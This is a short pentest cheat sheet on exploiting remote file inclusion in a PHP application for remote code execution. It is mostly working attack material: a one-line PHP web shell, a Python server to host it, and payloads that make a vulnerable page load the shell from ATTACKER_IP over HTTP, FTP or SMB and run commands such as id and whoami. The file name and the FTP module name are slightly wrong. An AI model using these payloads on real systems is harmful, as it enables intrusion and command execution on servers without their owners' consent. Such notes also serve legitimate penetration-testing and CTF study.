
Remote File Inclusions, allow you to enter a remote IP address in the payload.

```
index.php?language=http://127.0.0.1:80/index.php
```

### RCE via RFI

1) Create a reverse_shell.php on local machine:
```cli
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

2) Open python listener, preferably on port 443 or 80
```cli
python3 -m http.server 80
```

3) Add the payload to the RFI vulnerable parameter specifying what command to execute
```
/index.php?language=http://ATTACKER_IP:LISTENING_PORT/shell.php&cmd=id
```

### FTP

If http is blocked by WAF try sending via ftp. Instead of an HTTP server, start a ftp server in python.

```cli
sudo python -m pyftplib -p 21
```

Then payload would be:

```
ftp://ATTACKER_IP/shell.php&cmd=id
```

### SMB

If vulnerable webapp is hosted on a Windows server, use impacket smb server to send payload.

```cli
impacket-smbserver -smb2support share $(pwd)
```

The RFI payload is:

```
\\ATTACKER_IP\share\shell.php&cmd=whoami
```

